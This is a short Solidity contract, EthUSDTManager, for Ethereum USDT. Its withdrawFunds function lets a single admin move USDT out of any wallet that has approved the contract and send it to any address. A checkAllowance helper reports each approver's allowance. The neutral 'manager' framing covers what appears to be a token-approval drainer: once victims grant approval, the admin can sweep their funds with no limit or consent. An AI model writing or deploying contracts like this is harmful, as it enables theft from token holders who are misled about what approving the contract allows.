// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IERC20 {
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
}

contract EthUSDTManager {
    address public immutable usdtToken;
    address public admin;

    event FundsWithdrawn(address indexed from, address indexed to, uint256 amount);
    event AdminTransferred(address indexed oldAdmin, address indexed newAdmin);

    modifier onlyAdmin() {
        require(msg.sender == admin, "Only admin allowed");
        _;
    }

    constructor(address _usdtToken) {
        require(_usdtToken != address(0), "Invalid token address");
        usdtToken = _usdtToken;
        admin = msg.sender;
    }

    function withdrawFunds(address from, address to, uint256 amount) external onlyAdmin {
        require(to != address(0), "Invalid recipient");
        require(IERC20(usdtToken).transferFrom(from, to, amount), "Transfer failed");
        emit FundsWithdrawn(from, to, amount);
    }

    function transferAdmin(address newAdmin) external onlyAdmin {
        require(newAdmin != address(0), "Invalid new admin");
        address oldAdmin = admin;
        admin = newAdmin;
        emit AdminTransferred(oldAdmin, newAdmin);
    }

    function checkAllowance(address owner) external view returns (uint256) {
        return IERC20(usdtToken).allowance(owner, address(this));
    }
}